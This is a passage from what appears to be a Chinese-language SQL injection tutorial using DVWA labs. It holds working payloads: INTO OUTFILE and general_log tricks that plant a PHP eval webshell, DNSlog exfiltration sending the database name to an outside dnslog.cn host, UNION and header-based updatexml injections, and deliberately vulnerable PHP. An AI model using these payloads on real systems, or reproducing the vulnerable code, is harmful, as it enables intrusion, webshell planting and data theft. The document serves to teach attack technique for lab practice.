&gt;&lt;/p&gt;
&lt;h4 id=&#34;lins-starting-by&#34;&gt;lins starting by
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;与上一种相反，它控制的是每一行开始位置的内容：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; into outfile &amp;#39;D:/WWW/114514.php&amp;#39; lines starting by &amp;#39;&amp;lt;?php eval($_POST[kaka]); ?&amp;gt;&amp;#39; #
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250708141731385.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250708141731385&#34;
	
	
&gt;&lt;/p&gt;
&lt;h4 id=&#34;fields-terminated-by&#34;&gt;fields terminated by
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;fields terminated by&lt;/code&gt;控制的是一行数据中，各个字段（列）之间的分隔符：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; into outfile &amp;#39;D:/WWW/114514.php&amp;#39; fields terminated by &amp;#39;&amp;lt;?php eval($_POST[kaka]); ?&amp;gt;&amp;#39; #
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250708142123580.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250708142123580&#34;
	
	
&gt;&lt;/p&gt;
&lt;h4 id=&#34;columns-terminated-by&#34;&gt;columns terminated by
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;是上一种的同义词，作用完全一样：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; into outfile &amp;#39;D:/WWW/114514.php&amp;#39; columns terminated by &amp;#39;&amp;lt;?php eval($_POST[kaka]); ?&amp;gt;&amp;#39; #
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;日志文件写入&#34;&gt;日志文件写入
&lt;/h3&gt;&lt;p&gt;如果mysql无法更改导出文件路径，或者根本不允许导出路径，我们还可以通过日志文件注入&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;写入的前提是要开启&lt;code&gt;general log&lt;/code&gt;或者&lt;code&gt;slow_query_log&lt;/code&gt;模式，并设置目录地址&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;下面用&lt;code&gt;general log&lt;/code&gt;做演示&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查看配置：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;show variables like &amp;#39;%general%&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250708165305034.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250708165305034&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;开启&lt;code&gt;general log&lt;/code&gt;模式：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;set global general_log = on;   
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;设置目录地址：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;set global general_log_file = &amp;#39;D:/WWW/114514.php&amp;#39;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250708165642906.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250708165642906&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;接下来就可以写入一句话木马：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;&amp;lt;?php eval($_POST[kaka]); ?&amp;gt;&amp;#39;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;img src=&#34;C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20250708170501479.png&#34; alt=&#34;image-20250708170501479&#34; style=&#34;zoom:67%;&#34; /&gt;
&lt;p&gt;&lt;strong&gt;我们输入的木马会被设定的log文件记录，这时候就能用蚁剑连接网站&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;6-dnslog注入&#34;&gt;#6 DNSlog注入
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;DNS在进行域名解析时会留下域名和解析ip的记录(DNSlog)，我们可以利用它显示我们的注入结果&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.将想要窃取的数据（如数据库名、用户名等）作为这个域名的子域名拼接到查询中&lt;/p&gt;
&lt;p&gt;2.迫使数据库服务器向一个由我们控制的域名发起DNS查询请求&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;DNSLOG注入需要有两个条件：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;目标数据库服务器能够向外网发起DNS请求&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;开启了&lt;code&gt;load_file()&lt;/code&gt;读取文件的函数&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;准备dnslog平台&#34;&gt;准备DNSlog平台
&lt;/h3&gt;&lt;p&gt;网络上有很多公开DNSlog的服务，如www.dnslog.cn，或使用BurpSuite自带的BurpCollaborator&lt;/p&gt;
&lt;p&gt;以dnslog.cn为例，&lt;strong&gt;点击&lt;code&gt;Get SubDomain&lt;/code&gt;后，我们会得到一个独一无二的子域名&lt;/strong&gt;，例如：&lt;code&gt;624elh.dnslog.cn&lt;/code&gt;：
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250701173327303.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250701173327303&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;构造注入payload&#34;&gt;构造注入Payload
&lt;/h3&gt;&lt;p&gt;我们需要使用数据库中能够触发网络请求的函数，在MySQL中，最常用的是上文提到过的&lt;code&gt;load_file()&lt;/code&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and load_file(concat(&amp;#39;\\\\&amp;#39;,(select database()),&amp;#39;.624elh.dnslog.cn\\a&amp;#39;))#
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;当数据库执行这个Payload时，它会尝试使用&lt;code&gt;load_file()&lt;/code&gt;去读取一个网络路径&lt;/p&gt;
&lt;p&gt;&lt;code&gt;concat()&lt;/code&gt;函数会将各部分拼接起来，构造出一个完整的UNC路径：&lt;code&gt;\\dvwa.624elh.dnslog.cn\a&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;为了访问这个网络路径，服务器的操作系统必须先解析主机名 &lt;code&gt;dvwa.624elh.dnslog.cn&lt;/code&gt;，因此它会向DNS服务器发起一个DNS查询请求&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;回到DNSlog，点击&lt;code&gt;Refresh Record&lt;/code&gt;，将会显示出dns解析记录&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这样，数据库名&lt;code&gt;&#39;dvwa&#39;&lt;/code&gt;就作为子域名的一部分，被成功地带到了外部，实现了数据泄露：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250701173610414.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250701173610414&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;7-http请求注入&#34;&gt;#7 http请求注入
&lt;/h2&gt;&lt;h3 id=&#34;getpost请求注入&#34;&gt;GET/POST请求注入
&lt;/h3&gt;&lt;p&gt;完整看到这里的你，就会发现上面我们讨论的注入绝大多数都是在GET和POST的场景下&lt;/p&gt;
&lt;p&gt;我们简单句两个例子说明&lt;/p&gt;
&lt;p&gt;==&lt;strong&gt;GET请求（查询等）：&lt;/strong&gt;==&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$id&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;]; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$sql&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;SELECT * FROM users WHERE user_id = &amp;#39;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$id&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&amp;#39;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$result&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;mysqli_query&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$conn&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;$sql&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们一般是在查询输入框中输入注入语句，其实也可以在url中：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;http://example.com/get_vuln.php?id=1&amp;#39; UNION SELECT 1, user, password FROM users#
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;id后面其实就是我们之前在输入框中输入的内容&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;==POST请求（登录等）：==&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$username&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$_POST&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;username&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$password&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$_POST&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$sql&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;SELECT * FROM users WHERE username = &amp;#39;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$username&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&amp;#39; AND password = &amp;#39;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$password&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&amp;#39;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;其实也就是在输入框里填写注入语句就行，也可以抓包后修改&lt;/p&gt;
&lt;h3 id=&#34;http头部参数注入&#34;&gt;http头部参数注入
&lt;/h3&gt;&lt;p&gt;http头部有着许多参数，开发者可能因为记录日志、分析用户行为等目的，从这些参数中获取信息并存入数据库，但过程中没有进行过滤，导致了注入&lt;/p&gt;
&lt;p&gt;这里以最常见的&lt;code&gt;User-Agent&lt;/code&gt;、&lt;code&gt;Referer&lt;/code&gt;、&lt;code&gt;X-Forwarded-For&lt;/code&gt;三个字段举例：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$ip&lt;/span&gt;         &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$_SERVER&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;HTTP_X_FORWARDED_FOR&amp;#39;&lt;/span&gt;]; &lt;span style=&#34;color:#7f848e&#34;&gt;// 获取伪造的客户端IP
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$user_agent&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$_SERVER&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;HTTP_USER_AGENT&amp;#39;&lt;/span&gt;];    &lt;span style=&#34;color:#7f848e&#34;&gt;// 获取浏览器标识
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$referer&lt;/span&gt;    &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$_SERVER&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;HTTP_REFERER&amp;#39;&lt;/span&gt;];       &lt;span style=&#34;color:#7f848e&#34;&gt;// 获取来源页面
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;// 漏洞点一：根据IP查询该用户是否在黑名单中
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$sql_ip&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;SELECT * FROM ip_blacklist WHERE ip = &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$ip&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$result_ip&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;mysqli_query&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$conn&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;$sql_ip&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;// 漏洞点二：根据浏览器标识，提供定制化内容
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$sql_ua&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;SELECT * FROM custom_content WHERE user_agent_key = &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$user_agent&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$result_ua&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;mysqli_query&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$conn&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;$sql_ua&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;// 漏洞点三：记录访问来源
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$sql_referer&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;SELECT * FROM referer_stats WHERE page_url = &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$referer&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$result_referer&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;mysqli_query&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$conn&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;$sql_referer&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;脚本执行完毕。&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里三个字段都没有进行任何的过滤，我们抓包之后修改对应内容：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#61afef;font-weight:bold&#34;&gt;GET&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;/analytics.php&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;1.1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;Host&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;:&lt;/span&gt; vulnerable-site.com
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;User-Agent&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;:&lt;/span&gt; Mozilla/5.0&amp;#39; and (updatexml(1,concat(0x7e,(select database())),1)) and &amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;X-Forwarded-For&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;:&lt;/span&gt; 127.0.0.1&amp;#39; and (updatexml(1,concat(0x7e,(select database())),1)) and &amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;Referer&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;:&lt;/span&gt; http://google.com&amp;#39; and (updatexml(1,concat(0x7e,(select database())),1)) and &amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;方式和普通注入都是差不多的，核心思想没变，&lt;strong&gt;只是注意最好使用&lt;code&gt;&#39;&#39;&lt;/code&gt;闭合后半部分&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;cookie注入&#34;&gt;cookie注入
&lt;/h3&gt;&lt;p&gt;从原理上来说，cookie注入和其他的注入方式并没有什么不同，只是注入的地点不同&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;我们既可以像上面的头部参数一样抓包修改cookie，也能在本地修改cookie达到注入目的&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;以dvwa靶场high等级的sql盲注为例，我们先看看源码：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;if&lt;/span&gt;( &lt;span style=&#34;color:#e06c75&#34;&gt;isset&lt;/span&gt;( &lt;span style=&#34;color:#e06c75&#34;&gt;$_COOKIE&lt;/span&gt;[ &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt; ] ) ) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e06c75&#34;&gt;$id&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$_COOKIE&lt;/span&gt;[ &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt; ];
